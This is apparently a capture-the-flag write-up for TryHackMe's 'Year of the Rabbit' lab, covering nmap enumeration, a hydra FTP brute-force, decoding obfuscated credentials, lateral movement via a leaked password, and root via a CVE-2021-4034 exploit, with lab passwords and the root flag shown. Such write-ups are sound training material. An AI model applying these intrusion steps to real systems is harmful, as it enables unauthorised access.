---
title: "Year of the Rabbit"
date: 2022-08-30 10:00:40 +0530
categories: [TryHackMe, THM-Linux]
tags: [Machines,Linux]
image: /assets/img/yearOfRabbit/profile.png
---

This is the [tryhackme](https://tryhackme.com/room/yearoftherabbit) room with difficult level `easy`.

## Enumeration.
### nmap scanning.

**Command.**
```
 nmap -sC -sV 10.10.59.107 -oN nmap-scan 
```
**Results**
```
# Nmap 7.92 scan initiated Fri May 20 22:37:30 2022 as: nmap -sC -sV -oN nmap-scan 10.10.59.107
Nmap scan report for 10.10.59.107
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 20 22:38:15 2022 -- 1 IP address (1 host up) scanned in 45.31 seconds
```

### Burp-suit.

![image](/assets/img/yearOfRabbit/burp.png)

**Visit  the hidden directory**
```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU 
```
Then navigate to ``http://thm-machine-ip/WExYY2Cv-qU/``

This will lead us to the directory which has an image named as ``Hot_Babe.png.`` I renamed it to `bae.png.`
![image](/assets/img/yearOfRabbit/bae.png)

**Checking if there is any message in the image.**
```
└─$ strings bae.png
```
We found a message as shown below.


>message from image
>
>Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:


## Brute-force ftp password.
```
└─$ hydra -l ftpuser -P "ftp-passwds" -s 21 -o "ftp-results" ftp://10.10.59.107 
```
**Result.**
```
password: 5iez1wGXKfPKQ
```

## Login to ftp server.

```
└─$ ftp 10.10.59.107
Connected to 10.10.59.107.
220 (vsFTPd 3.0.2)
Name (10.10.59.107:egovridc): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

**List ftp files.**
```
ftp> ls 
229 Entering Extended Passive Mode (|||33780|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
```

**Download  Eli's_Creds.txt from ftp server.**
```
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
229 Entering Extended Passive Mode (|||12303|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |*************************************************************************|   758      622.04 KiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (4.46 KiB/s)
ftp> 
```

**Reading Eli's_Creds.txt.**
```
└─$ cat Eli\'s_Creds.txt 
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

The file is obfuscated  with brainfuck, so i decided to use online [brainfuck](https://www.dcode.fr/brainfuck-language) tool to decrypt.

**Results**
```
User: eli
Password: DSpDiM1wAEwid
```

## Login into Eli's machine by using ssh.

**ssh**
```
└─$ ssh eli@10.10.59.107 
```

>message from root 
>
>1 new message
>
>Message from Root to Gwendoline:
>"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
>
>END MESSAGE
 
## User privilege escalation.

### Find secret message from root.
 
**s3cr3t**
```
eli@year-of-the-rabbit:~$ find /  -name *s3cr3t* 2>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
```

**Reading the file.**
```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```
It contains password for user gwendoline.

**Switch to user gwendoline.**
```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendoline
Password: 
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ whoami
gwendoline
```

## Root privilege escalation.

`CVE-2021-4034`
Send the files to the victim machine and run `make` then `exploit`
Results.

**Root user**
```
gwendoline@year-of-the-rabbit:~$ make
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
gwendoline@year-of-the-rabbit:~$ ls
evil.so  evil-so.c  exploit  exploit.c  Makefile  user.txt
gwendoline@year-of-the-rabbit:~$ ./exploit 
# cd /root
# ls
root.txt
# cat root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
# 
```

**End.**